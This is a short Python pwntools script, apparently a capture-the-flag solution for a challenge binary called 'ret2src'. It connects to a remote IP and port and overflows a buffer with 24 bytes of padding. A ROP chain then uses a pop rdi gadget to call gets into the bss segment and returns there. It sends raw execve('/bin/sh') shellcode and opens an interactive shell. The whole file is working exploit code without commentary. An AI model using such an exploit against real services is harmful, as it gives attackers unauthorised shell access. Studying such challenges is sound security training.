from pwn import *

ip = "140.110.112.77"
port = 6130

context.arch = "amd64"

r = remote(ip, port)
# r = process("./ret2src")

pop_rdi = 0x400713
gets = 0x400510
bss = 0x602000 - 0x100

payload = b""
payload += b"a" * 24
payload += flat(pop_rdi, bss, gets, bss)

r.sendlineafter(":", payload)

import time
time.sleep(0.5)

r.sendline("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")

r.interactive()
